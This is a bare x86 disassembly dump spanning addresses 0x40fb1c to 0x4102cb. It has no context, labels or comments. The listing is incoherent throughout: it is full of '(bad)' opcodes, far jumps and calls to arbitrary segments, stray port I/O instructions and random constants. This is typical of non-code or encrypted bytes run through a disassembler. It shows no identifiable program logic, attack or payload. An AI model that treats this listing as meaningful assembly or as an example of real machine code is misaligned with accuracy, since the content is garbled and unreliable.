  40fb1c:	outs   dx,DWORD PTR ds:[esi]
  40fb1d:	loop   0x40faf4
  40fb1f:	inc    edx
  40fb20:	jns    0x40fb5b
  40fb22:	cmp    al,0xdb
  40fb24:	je     0x40fb3b
  40fb26:	xor    al,0x75
  40fb28:	ret    
  40fb29:	mov    eax,edi
  40fb2b:	gs pusha 
  40fb2d:	fst    QWORD PTR [ebx]
  40fb2f:	popa   
  40fb30:	adc    ecx,DWORD PTR gs:[edx+0x13]
  40fb34:	jno    0x40fad4
  40fb36:	nop
  40fb37:	dec    eax
  40fb38:	sbb    DWORD PTR [eax+0x4d],edx
  40fb3b:	loop   0x40faf8
  40fb3d:	and    ch,bh
  40fb3f:	push   ebx
  40fb40:	mov    cl,0xea
  40fb42:	stos   BYTE PTR es:[edi],al
  40fb43:	dec    ebp
  40fb44:	push   ds
  40fb45:	in     al,dx
  40fb46:	out    dx,eax
  40fb47:	dec    ebp
  40fb48:	js     0x40fb55
  40fb4a:	in     eax,0x28
  40fb4c:	push   ss
  40fb4d:	xor    al,0xd5
  40fb4f:	test   DWORD PTR ds:0xef7504e1,ebp
  40fb55:	and    DWORD PTR [eax-0x46],edx
  40fb58:	mov    DWORD PTR [esi+0x597140c0],ebx
  40fb5e:	sbb    eax,0x17b3b18e
  40fb63:	(bad)  
  40fb64:	pop    ebp
  40fb65:	and    BYTE PTR [ecx+edx*4],bl
  40fb68:	or     BYTE PTR [edx+ebp*2],ch
  40fb6b:	ins    BYTE PTR es:[edi],dx
  40fb6c:	push   ds
  40fb6d:	mov    ebp,ss
  40fb6f:	ds mov ebp,0xb2a1bc0c
  40fb75:	jge    0x40fba0
  40fb77:	jne    0x40fb71
  40fb79:	fdiv   QWORD PTR [ecx+edi*2]
  40fb7c:	sbb    BYTE PTR [esi-0x24851993],0xbe
  40fb83:	aad    0x8d
  40fb85:	lahf   
  40fb86:	and    esi,DWORD PTR ds:0x7597360a
  40fb8c:	dec    BYTE PTR [eax+ebx*4-0x753363dc]
  40fb93:	test   BYTE PTR [ecx-0x19],dh
  40fb96:	ja     0x40fbe8
  40fb98:	cmp    DWORD PTR [ecx],0x36d9091d
  40fb9e:	or     BYTE PTR [edi+0x1a801fd6],ch
  40fba4:	repnz push cs
  40fba6:	int    0xca
  40fba8:	jno    0x40fb4c
  40fbaa:	jl     0x40fbcf
  40fbac:	mov    ch,BYTE PTR [eax+0x26deac12]
  40fbb2:	add    BYTE PTR ds:[ecx],dl
  40fbb5:	mov    bl,0x30
  40fbb7:	and    eax,0xa0bc73f8
  40fbbc:	jno    0x40fbff
  40fbbe:	lods   al,BYTE PTR ds:[esi]
  40fbbf:	mov    al,0xd7
  40fbc1:	(bad)  
  40fbc2:	dec    edi
  40fbc3:	cdq    
  40fbc4:	mov    ds:0xb42c1623,eax
  40fbc9:	sahf   
  40fbca:	mov    BYTE PTR ds:0xae0a15f,dh
  40fbd0:	in     al,dx
  40fbd1:	loop   0x40fba8
  40fbd3:	or     eax,0xacb3f6ce
  40fbd8:	cdq    
  40fbd9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fbda:	(bad)  
  40fbdb:	out    0x57,eax
  40fbdd:	and    BYTE PTR [ebp-0x52],bh
  40fbe0:	nop
  40fbe1:	add    bh,cl
  40fbe3:	cmp    DWORD PTR [edi+0x5f1ad5ea],ecx
  40fbe9:	mov    ecx,0x4c28d422
  40fbee:	lods   al,BYTE PTR ds:[esi]
  40fbef:	jne    0x40fbac
  40fbf1:	dec    esi
  40fbf2:	clc    
  40fbf3:	xor    al,0x75
  40fbf5:	in     al,dx
  40fbf6:	dec    edx
  40fbf7:	mov    ds:0xde8fd71,al
  40fbfc:	mov    eax,ds:0xa94494f7
  40fc01:	or     eax,0x17b27529
  40fc06:	out    dx,al
  40fc07:	adc    BYTE PTR [ebp+0x71f04105],ch
  40fc0d:	sub    BYTE PTR [ecx+0x48],ah
  40fc10:	or     esp,DWORD PTR [ebp+edx*4+0x792ef1da]
  40fc17:	addr16 aas 
  40fc19:	int    0x35
  40fc1b:	mov    WORD PTR [eax-0x5229ca8c],ss
  40fc21:	into   
  40fc22:	pop    es
  40fc23:	cmc    
  40fc24:	jne    0x40fc41
  40fc26:	mov    ebp,0x2baeebe1
  40fc2b:	mov    dl,0xf8
  40fc2d:	jl     0x40fc84
  40fc2f:	fst    QWORD PTR [ecx]
  40fc31:	jmp    0xa5d5:0x3c13ca3a
  40fc38:	(bad)  
  40fc39:	out    0xde,eax
  40fc3b:	adc    BYTE PTR [esi+0xbaebe63],dh
  40fc41:	mov    DWORD PTR [ebp-0x71],edx
  40fc44:	jmp    0x9ea845b2
  40fc49:	(bad)  
  40fc4a:	aad    0x64
  40fc4c:	mov    eax,ds:0x7a0159c2
  40fc51:	das    
  40fc52:	xchg   BYTE PTR [ebp-0x40],dh
  40fc55:	test   eax,0xde170c3e
  40fc5a:	mov    esi,0x9b687166
  40fc5f:	cmp    cl,bh
  40fc61:	xchg   edx,eax
  40fc62:	popf   
  40fc63:	jbe    0x40fcc5
  40fc65:	cmp    al,0x22
  40fc67:	ins    BYTE PTR es:[edi],dx
  40fc68:	jmp    0x40fc89
  40fc6a:	xrstors [esi+esi*2+0x78]
  40fc6f:	inc    esi
  40fc70:	jno    0x40fc2b
  40fc72:	cmp    esi,DWORD PTR [ebx-0x3ae364c6]
  40fc78:	cld    
  40fc79:	pop    ds
  40fc7a:	and    BYTE PTR [ebp-0x27],ch
  40fc7d:	je     0x40fca1
  40fc7f:	or     eax,ecx
  40fc81:	pushf  
  40fc82:	aad    0x22
  40fc84:	dec    ebp
  40fc85:	pop    ss
  40fc86:	lahf   
  40fc87:	mov    edi,0x75280435
  40fc8c:	fsub   st(7),st
  40fc8e:	or     ebx,DWORD PTR [edi-0x3576dcd9]
  40fc94:	jg     0x40fc54
  40fc96:	push   ds
  40fc97:	cmp    dl,cl
  40fc99:	add    al,0x66
  40fc9b:	inc    eax
  40fc9c:	xor    ecx,DWORD PTR [edx+0x1a21f4ee]
  40fca2:	into   
  40fca3:	nop
  40fca4:	lods   eax,DWORD PTR ds:[esi]
  40fca5:	pop    ds
  40fca6:	sbb    ax,0x8dac
  40fcaa:	add    bl,dl
  40fcac:	fdivr  st(2),st
  40fcae:	push   ecx
  40fcaf:	lock in eax,0xc6
  40fcb2:	aad    0x89
  40fcb4:	loopne 0x40fc9d
  40fcb6:	jecxz  0x40fc3c
  40fcb8:	dec    ebx
  40fcb9:	xchg   ebx,eax
  40fcba:	popa   
  40fcbb:	jl     0x40fd0e
  40fcbd:	ret    
  40fcbe:	pusha  
  40fcbf:	mov    WORD PTR [edx],gs
  40fcc1:	cmp    BYTE PTR [ebx-0x2f],0x19
  40fcc5:	or     eax,0x91dc85d6
  40fcca:	data16 loope 0x40fc64
  40fccd:	jo     0x40fc6b
  40fccf:	jne    0x40fc64
  40fcd1:	jb     0x40fd4f
  40fcd3:	inc    ebp
  40fcd4:	mov    esi,0x714c3215
  40fcd9:	fs mov ah,0x53
  40fcdc:	int3   
  40fcdd:	fucomp st(4)
  40fcdf:	xchg   ecx,eax
  40fce0:	adc    BYTE PTR [ecx+0x227074fb],dl
  40fce6:	push   ebp
  40fce7:	iret   
  40fce8:	js     0x40fc83
  40fcea:	sub    ch,BYTE PTR [ecx]
  40fcec:	jno    0x40fd46
  40fcee:	rol    BYTE PTR [edx],0x23
  40fcf1:	mov    eax,0x1fe4c556
  40fcf6:	dec    esi
  40fcf7:	push   cs
  40fcf8:	dec    dx
  40fcfa:	iret   
  40fcfb:	jnp    0x40fd23
  40fcfd:	clc    
  40fcfe:	aad    0x71
  40fd00:	and    esi,0xc5bdf55c
  40fd06:	hlt    
  40fd07:	in     eax,dx
  40fd08:	call   0x96d:0x84758e9d
  40fd0f:	fs push ds
  40fd11:	call   0x41c3:0xb58d4697
  40fd18:	jno    0x40fcbd
  40fd1a:	xor    eax,0xa88bd2c4
  40fd1f:	xchg   edx,eax
  40fd20:	pop    ds
  40fd21:	and    ebp,DWORD PTR [ebp+0x38]
  40fd24:	and    DWORD PTR [eax],esi
  40fd26:	bound  ebx,QWORD PTR [ebx+0x3f6fb109]
  40fd2c:	jno    0x40fd4e
  40fd2e:	test   eax,0x167aee97
  40fd33:	sub    BYTE PTR [ebp+0x20],cl
  40fd36:	inc    esp
  40fd37:	adc    eax,0xa5d9aca3
  40fd3c:	in     eax,0xd5
  40fd3e:	jecxz  0x40fd24
  40fd40:	dec    esp
  40fd41:	icebp  
  40fd42:	pusha  
  40fd43:	push   ebp
  40fd44:	jecxz  0x40fd8e
  40fd46:	repz xor al,0xb0
  40fd49:	adc    DWORD PTR [ebx+ecx*4],eax
  40fd4c:	cmp    edi,DWORD PTR [edi-0x1c548a9a]
  40fd52:	cld    
  40fd53:	cdq    
  40fd54:	add    BYTE PTR [ebx-0x2b],bl
  40fd57:	mov    eax,ds:0x93efec64
  40fd5c:	sub    DWORD PTR [edx+eax*8+0x75],0xf95bf9da
  40fd64:	leave  
  40fd65:	cmp    eax,0x5c71990c
  40fd6a:	inc    DWORD PTR [ebp+0x53]
  40fd6d:	jns    0x40fd7c
  40fd6f:	xor    ebp,ebp
  40fd71:	pop    eax
  40fd72:	mov    BYTE PTR [edi+0x71],ah
  40fd75:	cmp    DWORD PTR [edx+0x2d],ebx
  40fd78:	sub    BYTE PTR [esi-0x62],dh
  40fd7b:	mov    dl,0x71
  40fd7d:	sbb    al,0x7c
  40fd7f:	nop
  40fd80:	jb     0x40fd80
  40fd82:	mov    eax,ds:0xe21fd88c
  40fd87:	pop    edi
  40fd88:	jns    0x40fdca
  40fd8a:	add    ebp,DWORD PTR ds:0xbc057c04
  40fd90:	pop    esi
  40fd91:	inc    edx
  40fd92:	push   ds
  40fd93:	out    dx,eax
  40fd94:	stos   BYTE PTR es:[edi],al
  40fd95:	pop    eax
  40fd96:	scas   eax,DWORD PTR es:[edi]
  40fd97:	out    0x71,eax
  40fd99:	ds push es
  40fd9b:	dec    ebx
  40fd9c:	jns    0x40fd29
  40fd9e:	sub    DWORD PTR [ecx+0x30d6c0f0],ebp
  40fda4:	and    edx,DWORD PTR [ebp-0x3450fec0]
  40fdaa:	add    eax,0xe13dba0e
  40fdaf:	test   ch,dl
  40fdb1:	lea    edx,es:[ebx]
  40fdb4:	neg    bh
  40fdb6:	adc    DWORD PTR [edi-0x65],eax
  40fdb9:	cmp    ebp,edx
  40fdbb:	jnp    0x40fdec
  40fdbd:	or     ah,BYTE PTR [esi+ecx*2]
  40fdc0:	mov    esi,0x2c751992
  40fdc5:	mov    dl,al
  40fdc7:	mov    al,0x62
  40fdc9:	xchg   cl,dh
  40fdcb:	shl    BYTE PTR [ecx-0x4a],1
  40fdce:	imul   esi,edi,0x2595fda3
  40fdd4:	imul   esp,DWORD PTR [eax],0xffffffe5
  40fdd7:	std    
  40fdd8:	dec    eax
  40fdd9:	jbe    0x40fddc
  40fddb:	push   ebp
  40fddc:	ror    BYTE PTR [edi-0x2b],cl
  40fddf:	ret    
  40fde0:	xchg   esi,eax
  40fde1:	mov    al,ds:0x106c4b0f
  40fde6:	int3   
  40fde7:	jne    0x40fe56
  40fde9:	push   es
  40fdea:	sub    BYTE PTR [edx],dl
  40fdec:	js     0x40fd78
  40fdee:	leave  
  40fdef:	sbb    dl,BYTE PTR [ebp+0x71c5eb5b]
  40fdf5:	mov    ebx,ds
  40fdf7:	popf   
  40fdf8:	or     eax,0x2d75cc52
  40fdfd:	sub    ecx,DWORD PTR [ebx+0x73ea13c1]
  40fe03:	(bad)  
  40fe04:	jno    0x40fde3
  40fe06:	out    0xcc,al
  40fe08:	mov    dl,BYTE PTR [esi+0x5bda270c]
  40fe0e:	leave  
  40fe0f:	cmp    ebp,DWORD PTR [ecx+0x5b]
  40fe12:	or     eax,0x2a571c5
  40fe17:	pop    esp
  40fe18:	scas   al,BYTE PTR es:[edi]
  40fe19:	jp     0x40fe00
  40fe1b:	pop    esp
  40fe1c:	stos   BYTE PTR es:[edi],al
  40fe1d:	sbb    ebx,DWORD PTR [ebp+0x40a062ad]
  40fe23:	mov    DWORD PTR [esi+0x66],esi
  40fe26:	adc    esp,DWORD PTR [edx-0x3f7ee073]
  40fe2c:	pop    ebx
  40fe2d:	adc    ah,BYTE PTR [edi-0x3a786de9]
  40fe33:	cli    
  40fe34:	jno    0x40fe8a
  40fe36:	nop
  40fe37:	xor    eax,0x284e6996
  40fe3c:	repnz pop ds
  40fe3e:	push   esp
  40fe3f:	mov    bh,0xff
  40fe41:	mov    eax,ds:0x20f974a6
  40fe46:	bnd jge 0x40fdf9
  40fe49:	mov    ah,0x55
  40fe4b:	and    cl,BYTE PTR [ebx+0x43]
  40fe4e:	ds pop es
  40fe50:	rcr    BYTE PTR [edi],1
  40fe52:	dec    esi
  40fe53:	das    
  40fe54:	adc    esp,0x19
  40fe57:	sub    eax,0xdb52e31c
  40fe5c:	test   eax,0xa15e4573
  40fe61:	outs   dx,DWORD PTR ds:[esi]
  40fe62:	shr    DWORD PTR [ebx+0x4],0x20
  40fe66:	sub    al,BYTE PTR [edx-0x6b]
  40fe69:	inc    ebp
  40fe6a:	push   edi
  40fe6b:	sbb    al,0x7
  40fe6d:	stos   DWORD PTR es:[edi],eax
  40fe6e:	(bad)  
  40fe6f:	jle    0x40fe70
  40fe71:	push   ss
  40fe72:	push   ebx
  40fe73:	outs   dx,DWORD PTR ds:[esi]
  40fe74:	xor    edi,edx
  40fe76:	rcr    BYTE PTR [ebp+0x5a],0x6
  40fe7a:	cmc    
  40fe7b:	je     0x40fe96
  40fe7d:	push   edi
  40fe7e:	daa    
  40fe7f:	mov    al,0xe6
  40fe81:	lods   eax,DWORD PTR ds:[esi]
  40fe82:	dec    esp
  40fe83:	mov    edi,0x61a60171
  40fe88:	xor    eax,0xaad2871b
  40fe8d:	cmp    eax,0x3eee5113
  40fe92:	shl    DWORD PTR [ebp-0x79],1
  40fe95:	ja     0x40fee2
  40fe97:	mov    edx,0x55d61086
  40fe9c:	and    eax,0xcdc6b499
  40fea1:	or     esi,DWORD PTR [esi*2-0x99ede93]
  40fea8:	adc    DWORD PTR [edx+0x34],esp
  40feab:	lea    eax,gs:[esi-0x4cef868]
  40feb2:	inc    esi
  40feb3:	sbb    eax,0x755c9e2d
  40feb8:	pop    eax
  40feb9:	and    cl,al
  40febb:	leave  
  40febc:	dec    ecx
  40febd:	inc    eax
  40febe:	test   al,0xa8
  40fec0:	add    BYTE PTR [ebp-0x25],0x63
  40fec4:	aad    0xbf
  40fec6:	shl    ebp,1
  40fec8:	push   ebx
  40fec9:	aaa    
  40feca:	inc    esp
  40fecb:	jne    0x40fe81
  40fecd:	cld    
  40fece:	cmp    esi,DWORD PTR [edi-0xd]
  40fed1:	pop    ss
  40fed2:	and    eax,0xe6b97150
  40fed7:	xchg   ecx,eax
  40fed8:	popf   
  40fed9:	loop   0x40fe7c
  40fedb:	xor    eax,0x21b522c1
  40fee0:	call   0xc6dd:0x54bc085a
  40fee7:	cmp    eax,0x881807e6
  40feec:	jno    0x40ff27
  40feee:	adc    DWORD PTR [esi-0x3e],edx
  40fef1:	mov    eax,ds
  40fef3:	pop    ds
  40fef4:	in     al,dx
  40fef5:	call   0x275e:0x34558348
  40fefc:	shl    DWORD PTR [edx+0x6e],1
  40feff:	jno    0x40fed6
  40ff01:	inc    edx
  40ff02:	add    ebp,DWORD PTR [ecx-0x30]
  40ff05:	test   ebp,edx
  40ff07:	lods   eax,DWORD PTR ds:[esi]
  40ff08:	pop    edi
  40ff09:	or     al,0x75
  40ff0b:	aaa    
  40ff0c:	mov    al,0x3e
  40ff0e:	mov    ds:0xc49ff416,eax
  40ff13:	push   0xa14d07ae
  40ff18:	jno    0x40ff36
  40ff1a:	jbe    0x40fef0
  40ff1c:	mov    ebx,0x10335ae0
  40ff21:	and    BYTE PTR [ebx],ah
  40ff23:	sbb    eax,0x15d74e97
  40ff28:	jnp    0x40febb
  40ff2a:	(bad)  
  40ff2b:	inc    ecx
  40ff2c:	pusha  
  40ff2d:	or     esp,esp
  40ff2f:	dec    esp
  40ff30:	daa    
  40ff31:	or     BYTE PTR [ebp+0xf6060d],bl
  40ff37:	jne    0x40ff09
  40ff39:	jg     0x40fef4
  40ff3b:	pop    ds
  40ff3c:	int    0xa9
  40ff3e:	in     eax,0x59
  40ff40:	jno    0x40ff53
  40ff42:	rcl    BYTE PTR [ecx+0x33c09b79],cl
  40ff48:	xlat   BYTE PTR ds:[ebx]
  40ff49:	cmp    eax,0xf6b7d06c
  40ff4e:	and    dh,BYTE PTR [ebp-0x75]
  40ff51:	pop    esi
  40ff52:	mov    ah,0x3b
  40ff54:	loopne 0x40ff5e
  40ff56:	xlat   BYTE PTR ds:[ebx]
  40ff57:	push   es
  40ff58:	not    BYTE PTR [ebx-0x4349d240]
  40ff5e:	xor    eax,0x2e1fe8ff
  40ff63:	push   es
  40ff64:	and    BYTE PTR [edi+0x76],bl
  40ff67:	mov    al,ds:0xedd5c88a
  40ff6c:	data16 (bad) 
  40ff6e:	ins    DWORD PTR es:[edi],dx
  40ff6f:	or     al,0xe9
  40ff71:	cs in  eax,dx
  40ff73:	xchg   edx,eax
  40ff74:	inc    esp
  40ff75:	xor    dl,ch
  40ff77:	xor    al,0xe7
  40ff79:	xor    eax,0x4ca44514
  40ff7e:	test   ecx,esi
  40ff80:	je     0x40ffe1
  40ff82:	push   ebx
  40ff83:	bound  esi,QWORD PTR [ebx]
  40ff85:	add    dl,al
  40ff87:	cmc    
  40ff88:	jns    0x40fffd
  40ff8a:	jne    0x410001
  40ff8c:	sbb    eax,0xfcda34d7
  40ff91:	fstp   TBYTE PTR [edx-0x3a]
  40ff94:	jno    0x40ffc5
  40ff96:	test   eax,0x3923389e
  40ff9b:	in     al,dx
  40ff9c:	mov    bl,BYTE PTR [edi]
  40ff9e:	sar    BYTE PTR ds:0xf5c32b3e,cl
  40ffa4:	mov    esi,0x71d68d63
  40ffa9:	dec    esp
  40ffaa:	bound  esi,QWORD PTR [ecx]
  40ffac:	sbb    DWORD PTR [edx],ebx
  40ffae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ffaf:	xor    esi,DWORD PTR [edx]
  40ffb1:	and    BYTE PTR [esi+0x44c5216d],dh
  40ffb7:	sub    ebp,DWORD PTR [edx+0x7fd7d1f4]
  40ffbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ffbe:	xchg   esi,edx
  40ffc0:	inc    ebp
  40ffc1:	loopne 0x40ffe1
  40ffc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ffc4:	xchg   ebx,eax
  40ffc5:	call   0xf0e07c81
  40ffca:	fidiv  DWORD PTR [edx+0x64b0c12c]
  40ffd0:	cmp    al,0x63
  40ffd2:	shl    ebp,cl
  40ffd4:	dec    ecx
  40ffd5:	cmp    ebp,DWORD PTR [edx-0x45ce5617]
  40ffdb:	cmc    
  40ffdc:	push   ebx
  40ffdd:	addr16 mov bl,0x6a
  40ffe0:	loopne 0x40ff77
  40ffe2:	push   edi
  40ffe3:	int    0x39
  40ffe5:	push   0x4c
  40ffe7:	jne    0x40ff88
  40ffe9:	pop    ss
  40ffea:	outs   dx,BYTE PTR ds:[esi]
  40ffeb:	cwde   
  40ffec:	mov    edi,0x712de288
  40fff1:	adc    eax,0xb588f241
  40fff6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fff7:	add    DWORD PTR [esi+0x20],0xfb36abd4
  40fffe:	add    bl,dl
  410000:	jl     0x40ffbf
  410002:	aad    0x87
  410004:	adc    bl,al
  410006:	dec    ebx
  410007:	lahf   
  410008:	bound  edx,QWORD PTR [eax+0x1fcaf128]
  41000e:	sbb    DWORD PTR ds:0xfbaa6bd2,0x6a
  410015:	iret   
  410016:	aad    0xb2
  410018:	mov    edi,ecx
  41001a:	enter  0x5b92,0x18
  41001e:	cld    
  41001f:	jns    0x41006a
  410021:	pop    edx
  410022:	div    bh
  410024:	mov    al,ss:0x79464782
  41002a:	aad    0x85
  41002c:	(bad)  
  41002d:	into   
  41002e:	adc    eax,0x19fdf261
  410033:	out    0xbf,eax
  410035:	setbe  BYTE PTR [ebp+0x59]
  410039:	cmp    dl,BYTE PTR [eax-0x335acfc3]
  41003f:	or     esi,DWORD PTR [ecx-0x28]
  410042:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  410044:	in     eax,dx
  410045:	xchg   esp,eax
  410046:	das    
  410047:	stc    
  410048:	add    BYTE PTR [ebx],0x84
  41004b:	or     eax,0x662b47fa
  410050:	daa    
  410051:	and    DWORD PTR [ebx-0x65],ecx
  410054:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410055:	retf   
  410056:	pop    es
  410057:	dec    eax
  410058:	jl     0x410055
  41005a:	push   ebx
  41005b:	push   DWORD PTR [ecx-0x6d]
  41005e:	cmp    DWORD PTR [esi+0x4b],edx
  410061:	(bad)  
  410062:	xor    esp,0xffffffb1
  410065:	sbb    eax,0x651275c7
  41006a:	mov    dl,0xb9
  41006c:	outs   dx,DWORD PTR ds:[esi]
  41006d:	mov    BYTE PTR [edx-0x5b],cl
  410070:	jae    0x41009c
  410072:	(bad)  
  410073:	(bad)
  410077:	xor    eax,0x74f56fe2
  41007c:	fs xchg dh,cl
  41007f:	fistp  QWORD PTR fs:[ebp-0x598ee5f2]
  410086:	xor    eax,0x6d2ebf5d
  41008b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41008c:	dec    ecx
  41008d:	and    BYTE PTR [edi+0x539113b6],bl
  410093:	lods   eax,DWORD PTR ds:[esi]
  410094:	jl     0x41005d
  410096:	aad    0xae
  410098:	cmc    
  410099:	push   ebx
  41009a:	push   0xffffffb3
  41009c:	test   BYTE PTR ds:0xb33754c,cl
  4100a2:	stos   DWORD PTR es:[edi],eax
  4100a3:	cmp    al,0xd0
  4100a5:	and    dl,BYTE PTR [ebx+0x12]
  4100a8:	jmp    0xf611d631
  4100ad:	sti    
  4100ae:	into   
  4100af:	cmp    eax,ebp
  4100b1:	imul   ebp,DWORD PTR [ecx+0x75],0xffffffb6
  4100b5:	leave  
  4100b6:	loopne 0x4100d5
  4100b8:	pop    edi
  4100b9:	imul   DWORD PTR [eax+0x434e7f6b]
  4100bf:	loope  0x4100ce
  4100c1:	loopne 0x4100a9
  4100c3:	xchg   esp,eax
  4100c4:	rol    BYTE PTR [ecx],cl
  4100c6:	pop    DWORD PTR [ebx-0x61d5de1d]
  4100cc:	push   ecx
  4100cd:	lds    ebp,FWORD PTR [ecx]
  4100cf:	jb     0x410083
  4100d1:	xor    ah,bl
  4100d3:	mov    bh,cl
  4100d5:	mov    edx,0x990a9c58
  4100da:	adc    eax,0xdae09516
  4100df:	je     0x410128
  4100e1:	rcr    BYTE PTR [esi-0x6c4cdfde],1
  4100e7:	xor    eax,0xf5c553b0
  4100ec:	out    0x6c,eax
  4100ee:	sub    DWORD PTR [ecx],ebx
  4100f0:	mov    ch,0xc2
  4100f2:	adc    BYTE PTR [ebp-0x4d],dh
  4100f5:	mov    ecx,0xa6468ed
  4100fa:	cmp    cl,BYTE PTR [ecx+0x25af3b71]
  410100:	sbb    al,0x9c
  410102:	lock (bad) 
  410104:	sahf   
  410105:	pop    ds
  410106:	mov    ds:0xe0a5f057,eax
  41010b:	fs push ds
  41010d:	xchg   esi,eax
  41010e:	aad    0x37
  410110:	mov    cl,0xa
  410112:	mov    esi,0x128e8470
  410117:	jne    0x4100a3
  410119:	test   eax,0x7c459992
  41011e:	cld    
  41011f:	cmp    dh,BYTE PTR [ecx+0x7a]
  410122:	ds mov cl,0x86
  410125:	clc    
  410126:	sub    dh,al
  410128:	sbb    ah,BYTE PTR [eax]
  41012a:	push   esp
  41012b:	inc    edx
  41012c:	sar    esi,0x7
  41012f:	cld    
  410130:	inc    eax
  410131:	scas   al,BYTE PTR es:[edi]
  410132:	paddsw mm6,QWORD PTR [esi]
  410135:	mov    al,ds:0x6d612b70
  41013a:	mov    eax,0x7b206827
  41013f:	ret    
  410140:	adc    cl,dh
  410142:	and    al,0x42
  410144:	fs push 0xffe7d4d5
  41014a:	jno    0x4101ad
  41014c:	fld    TBYTE PTR [edx]
  41014e:	xor    ebp,DWORD PTR [esi-0x3eaa5fda]
  410154:	in     eax,0xca
  410156:	sahf   
  410157:	cmp    ecx,esi
  410159:	(bad)  
  41015b:	mov    bh,0xbe
  41015d:	xor    dh,BYTE PTR [ecx]
  41015f:	sbb    cl,BYTE PTR [edi+0x5f]
  410162:	mov    ebp,0x591feefb
  410167:	sub    al,0x5c
  410169:	xchg   edi,eax
  41016a:	mov    cs,eax
  41016c:	and    bh,BYTE PTR [ecx-0x29]
  41016f:	aas    
  410170:	js     0x410194
  410172:	xchg   ecx,eax
  410173:	jmp    0xebe2:0x550c0329
  41017a:	(bad)  
  41017b:	je     0x4101cb
  41017d:	mov    edi,0x23a6c12c
  410182:	ss fs mov ch,ah
  410186:	in     al,dx
  410187:	sti    
  410188:	jno    0x410110
  41018a:	hlt    
  41018b:	jmp    0x228b:0x6527887f
  410192:	jns    0x41013c
  410194:	pop    ds
  410195:	(bad)
  410198:	sbb    DWORD PTR [eax+0x45],eax
  41019b:	inc    edx
  41019c:	jno    0x41017f
  41019e:	sahf   
  41019f:	mov    dh,0xf
  4101a1:	shl    DWORD PTR [ebx+ebx*1],cl
  4101a4:	ss pop esp
  4101a6:	xor    BYTE PTR [ebx],0xf1
  4101a9:	daa    
  4101aa:	push   ebx
  4101ab:	pop    edi
  4101ac:	push   eax
  4101ad:	jge    0x410221
  4101af:	std    
  4101b0:	jno    0x4101b5
  4101b2:	jnp    0x4101aa
  4101b4:	arpl   ax,sp
  4101b6:	or     al,0x5c
  4101b8:	fstp   QWORD PTR [edi]
  4101ba:	mov    ds:0xd089d055,eax
  4101bf:	mov    ds:0x3ef17870,eax
  4101c4:	scas   eax,DWORD PTR es:[edi]
  4101c5:	and    DWORD PTR [edx+0x3775757c],edx
  4101cb:	lods   eax,DWORD PTR ds:[esi]
  4101cc:	jno    0x4101ca
  4101ce:	mov    WORD PTR [esi-0x35],?
  4101d1:	pop    edx
  4101d2:	push   ss
  4101d3:	adc    bh,BYTE PTR [edi-0x76]
  4101d6:	lahf   
  4101d7:	hlt    
  4101d8:	xchg   ecx,eax
  4101d9:	cmc    
  4101da:	std    
  4101db:	out    0x15,al
  4101dd:	and    dl,ch
  4101df:	xchg   edx,eax
  4101e0:	fst    QWORD PTR [edi-0x1f]
  4101e3:	lea    ebx,[esi+0x2a7571a0]
  4101e9:	jns    0x4101a2
  4101eb:	and    al,0xe8
  4101ed:	mov    ch,0xd2
  4101ef:	out    0x71,al
  4101f1:	mov    WORD PTR [ecx-0x5684e06b],fs
  4101f7:	shl    DWORD PTR [ebx],0x9b
  4101fa:	jg     0x410278
  4101fc:	mov    eax,0xa0688adf
  410201:	aas    
  410202:	cdq    
  410203:	mov    ds,WORD PTR [edx+eax*8]
  410206:	fmul   DWORD PTR [ebx+0x1d902c9]
  41020c:	pop    ss
  41020d:	adc    BYTE PTR [edi+ebx*4],bh
  410210:	add    esp,DWORD PTR [eax]
  410212:	into   
  410213:	sbb    BYTE PTR [edi-0x1c],ch
  410216:	dec    ecx
  410217:	shl    BYTE PTR [edx+0x558d5de],cl
  41021d:	push   es
  41021e:	adc    BYTE PTR [edi],ah
  410220:	jg     0x4101f6
  410222:	sbb    eax,0x2e714d94
  410227:	jbe    0x41023b
  410229:	mov    DWORD PTR [ecx+0x21],0xa5bc4f7e
  410230:	jno    0x4101c2
  410232:	stc    
  410233:	xchg   ecx,eax
  410234:	sbb    ebx,ebx
  410236:	shr    DWORD PTR [eax],1
  410238:	das    
  410239:	push   es
  41023a:	es jne 0x410204
  41023d:	cmp    BYTE PTR [ebx+0x62],cl
  410240:	push   cs
  410241:	add    dh,BYTE PTR [edi-0x39]
  410244:	jb     0x41027f
  410246:	pop    ss
  410247:	cld    
  410248:	push   esi
  410249:	push   ecx
  41024a:	(bad)  
  41024c:	gs nop
  41024e:	inc    esi
  41024f:	jne    0x41027f
  410251:	cmc    
  410252:	imul   edx,ecx,0x864a11dd
  410258:	jno    0x41027d
  41025a:	test   eax,0x95f98c6d
  41025f:	cmp    eax,0x5df11fbd
  410264:	adc    BYTE PTR cs:[edi-0x2a8b843d],ah
  41026b:	shr    DWORD PTR [ebx+0x63],0xa8
  41026f:	data16 mov ?,WORD PTR [edi+0x39af113]
  410276:	sbb    eax,0x66dd6791
  41027b:	xor    eax,0x3135c4b7
  410280:	cld    
  410281:	outs   dx,DWORD PTR ds:[esi]
  410282:	aad    0xec
  410284:	sbb    al,BYTE PTR [esi-0x56]
  410287:	out    dx,eax
  410288:	jae    0x410216
  41028a:	sub    DWORD PTR [ebx+0x38f89933],eax
  410290:	mov    cl,0xa4
  410292:	pop    ds
  410293:	sub    BYTE PTR [edx+edi*2],cl
  410296:	dec    edx
  410297:	cmp    eax,0xef5d3871
  41029c:	fimul  WORD PTR [ebp+ecx*1+0x27]
  4102a0:	jae    0x4102c1
  4102a2:	imul   edx,DWORD PTR [edx-0x7fea58ba],0xffffff89
  4102a9:	iret   
  4102aa:	aad    0xdf
  4102ac:	cmp    ecx,esi
  4102ae:	lds    ebx,FWORD PTR [ecx]
  4102b0:	mul    eax
  4102b2:	push   0xae44a676
  4102b7:	xlat   BYTE PTR ds:[ebx]
  4102b8:	xchg   esp,eax
  4102b9:	pusha  
  4102ba:	lock cmp BYTE PTR [eax-0x44],dl
  4102be:	nop    DWORD PTR [eax-0x62e978e1]
  4102c5:	add    DWORD PTR ds:0x4205be1,esi
  4102cb:	not    BYTE PTR [edx+0x4d7cb2f9]
